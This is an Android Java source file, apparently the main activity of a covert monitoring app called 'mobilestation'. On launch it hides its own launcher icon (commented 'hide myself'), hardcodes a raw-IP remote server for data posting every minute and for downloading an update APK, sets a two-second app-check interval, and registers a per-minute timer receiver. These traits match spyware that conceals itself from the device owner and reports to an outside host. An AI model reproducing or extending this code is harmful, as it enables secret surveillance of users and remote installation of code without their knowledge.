package com.mobilestation;

import android.app.Activity;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;

import com.mobilestation.receiver.TimeBroadcastReceiver;
import com.mobilestation.util.AlarmManagerUtil;

public class MainActivity extends Activity {
	private static final String TAG = "DetailProceess";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_main);
		// runService();

		Log.i(TAG, "程序开始运行");
		
		//隐藏自己
		PackageManager p = getPackageManager();  
        p.setComponentEnabledSetting(getComponentName(),  
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,  
        PackageManager.DONT_KILL_APP); 

		SharedPreferences sharedPreferences = getSharedPreferences("setting",
				MODE_PRIVATE);
		Editor editor = sharedPreferences.edit();// 获取编辑器
		editor.putString("SERVER_URL", "http://58.64.194.214:8080");
		editor.putString("APK_PATH",
				"http://58.64.194.214:8080/Content/android.apk");
		editor.putString("UPDATE_SERVER", "http://58.64.194.214:8080");
		editor.putString("UPDATE_VERJSON", "ver.json");
		editor.putInt("POST_INTERVAL", 60 * 1000);
		editor.putInt("CHECKAPP_INTERVAL", 2 * 1000);
		editor.commit();// 提交修改

		AlarmManagerUtil.sendUpdateBroadcast(this.getApplicationContext());

		TimeBroadcastReceiver timeBroadcastReceiver = new TimeBroadcastReceiver();
		// 设置接收的action
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.intent.action.TIME_TICK");
		registerReceiver(timeBroadcastReceiver, filter);
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
